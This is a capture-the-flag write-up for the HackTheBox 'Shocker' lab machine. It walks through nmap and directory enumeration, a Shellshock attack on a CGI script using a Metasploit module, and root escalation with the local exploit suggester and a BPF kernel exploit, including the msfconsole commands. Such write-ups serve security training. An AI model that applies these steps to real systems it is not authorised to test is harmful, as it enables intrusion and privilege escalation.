---
layout: page
title: HackTheBox Shocker Writeup
---

By abusing a known exploit named [Shellshock](https://en.wikipedia.org/wiki/Shellshock_(software_bug)), I was able to get initial access onto HackTheBox's Shocker machine. For this, I used the metasploit exploit module `apache_mod_cgi_bash_env_exec`. Privilege escalation was pretty simple, did more enumeration to find suggested metasploit modules which one ended up privilege escalating my permissions to root.

### Enumeration 

Starting of with a standard enumeration scan: ```nmap -sC -sV -oA shocker 10.10.10.56```. Bellow is the output:

![image](https://user-images.githubusercontent.com/41026969/72769401-8d662100-3bc8-11ea-91a9-1633f24b6da5.png)

Port 80 which is used for HTTP is open to us. Checking out what the main page is to see if there's any clues:

![image](https://user-images.githubusercontent.com/41026969/72771202-23507a80-3bce-11ea-8efd-7463d2184f81.png)

We see that the home page is just an image. Next, I decide to enumerate to see if there's any interesting directories. 

The first tools I use is ```gobuster``` which is a CLI tool to bruteforce the websites files/directories. Here are the results:

![image](https://user-images.githubusercontent.com/41026969/72770980-7bd34800-3bcd-11ea-95a8-30e3ce733307.png)

Since gobuster didn't pick anything up, I decide to use dirbuster, which is a similar tool excepted it has a graphical interace to see if it picks up anything. Here are the settings that I used:

![image](https://user-images.githubusercontent.com/41026969/72772490-0b7af580-3bd2-11ea-8b11-6b01c06a3bad.png)

Here's what dirbuster finds:

![image](https://user-images.githubusercontent.com/41026969/72773203-5f86d980-3bd4-11ea-83ac-a88d269447a5.png)

There are a coupe interesting directories that dirbuster finds:

- ```/cgi-bin/```
- ```/server-status/```

##### Why gobuster didn't pick up /cgi-bin/
Because of the way gobuster checks for files/directories, it doesn't add a ```/``` at the end of the file name. So when visiting ```10.10.10.56/cgi-bin```, the page does not exist. However on dirbuster, this is account for so it also tries ```10.10.10.56/cgi-bin/``` which is a valid. This can be confirmed because if you use the wordlist in ```/usr/share/wordlists/dirb/small.txt``` it contains both ```cgi-bin``` and ```cgi-bin/```  in the list of words so it picks it up the ```cgi-bin/```. For gobuster, you can add the ```-f``` flag to append ```/``` at the end.

It looks like dirbuster didn't find any files in each of those directories though. Doing research on the ```[cgi-bin``` directory and reading into [the CGI wiki page](https://en.wikipedia.org/wiki/Common_Gateway_Interface#Using_CGI_scripts) I learned a bit how it works. Basically everytime there's an HTTP call to a script file in the ```address.com/cgi-bin``` directory, instead of sending the file from the local server, the server runs that file locally and then returns the output to the web page. Reading into the security part of the wiki page ```In common with a number of other scripts at the time, this script made use of a function: escape_shell_cmd(). The function was supposed to sanitize its argument, which came from user input and then pass the input to the Unix shell, to be run in the security context of the web server. The script did not correctly sanitize all input and allowed new lines to be passed to the shell, which effectively allowed multiple commands to be run. The results of these commands were then displayed on the web server. If the security context of the web server allowed it, malicious commands could be executed by attackers.```

Doing further research I come across [the Shellshock wiki page](https://en.wikipedia.org/wiki/Shellshock_(software_bug)). This is because one of the attack vectors for Shellshock is CGI. According to the wiki page ```When a web server uses the Common Gateway Interface (CGI) to handle a document request, it copies certain information from the request into the environment variable list and then delegates the request to a handler program. If the handler is a Bash script, or if it executes one for example using the system call, Bash will receive the environment variables passed by the server and will process them as described above. This provides a means for an attacker to trigger the Shellshock vulnerability with a specially crafted document request.``` 

With this information I decide to do a new dirbuster scan in that directory:

![image](https://user-images.githubusercontent.com/41026969/72947942-b5cd5700-3d51-11ea-8eef-4259175bf02a.png)

In the picture above, I start the directory/file scanning in the URL: ```http://10.10.10.56/cgi-bin```. And given what is read in the wiki pages, I add some file extensions: python, perl, and bash.

Here are the results of the scan:

![image](https://user-images.githubusercontent.com/41026969/72948083-1f4d6580-3d52-11ea-920b-3a6c7dff329c.png)

This time, we see there's a ```user.sh``` inside the ```cgi-bin``` directory! 

Doing some research I come across [this Rapid7 page](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec) with a metasploit module. 

Here's setting the correct options:

![image](https://user-images.githubusercontent.com/41026969/72995812-8eb16c80-3dc7-11ea-8a03-7d01ef98bd4a.png)

Running the module, we get a meterpreter session! Doing ```getuid``` and ```sysinfo``` outputs the following:

![image](https://user-images.githubusercontent.com/41026969/72996111-1a2afd80-3dc8-11ea-9c72-0b3b55752829.png)

Doing the meterpreter command ```shell``` gives us a local shell to work with. Doing a ```whoami``` check shows we are user ```shelly```. Looking around the computer, eventually I land in ```/home/shelly``` and doing an ```ls -la``` check there reveals the ```user.txt``` flag!

##### Privesc
To get a list of potential exploits that can work against this box, I use metasploit's suggester module: 

```
msf5 exploit(multi/http/apache_mod_cgi_bash_env_exec) > use post/multi/recon/local_exploit_suggester
msf5 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
```

Running the module we get a few results:

![image](https://user-images.githubusercontent.com/41026969/72999796-e4891300-3dcd-11ea-9910-8f8d35893c59.png)

I try the first module that the box ```appears to be vulnerable``` by: ```linux/local/bpf_sign_extension_priv_esc```.

Setting the correct options:

```
msf5 post(multi/recon/local_exploit_suggester) > use exploit/linux/local/bpf_sign_extension_priv_esc
msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > show options

Module options (exploit/linux/local/bpf_sign_extension_priv_esc):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   COMPILE  Auto             yes       Compile on target (Accepted: Auto, True, False)
   SESSION                   yes       The session to run this module on.


Exploit target:

   Id  Name
   --  ----
   0   Auto


msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set SESSION 1
SESSION => 1
```

At first, when I run the exploit, I get a ```[*] Exploit completed, but no session was created.```. Looking into the settings I try something different by setting the LHOST (local host) to my HackTheBox address:

```
msf5 exploit(linux/local/bpf_sign_extension_priv_esc) > set LHOST 10.10.14.48
LHOST => 10.10.14.48
```

Then rerunning the exploit, this time we get a second meterpreter session!

Doing a ```getuid``` in meterpreter or ```whoami``` in the local shell, it shows we have root access:

![image](https://user-images.githubusercontent.com/41026969/73001458-801b8300-3dd0-11ea-8532-369ac5ec5dff.png)

Looking around the box, I come across the root flag in ```/root/root.txt```

### Flags
- user: ```/home/shelly/user.txt```

- root: ```/root/root.txt```

### Sources

- [CGI wiki page](https://en.wikipedia.org/wiki/Common_Gateway_Interface#Using_CGI_scripts)
- [Shellshock wiki page](https://en.wikipedia.org/wiki/Shellshock_(software_bug))
- [mod-CGI bash environment Rapid7 page](https://www.rapid7.com/db/modules/exploit/multi/http/apache_mod_cgi_bash_env_exec)
- [Shocker video writeup by IppSec](https://www.youtube.com/watch?v=IBlTdguhgfY&)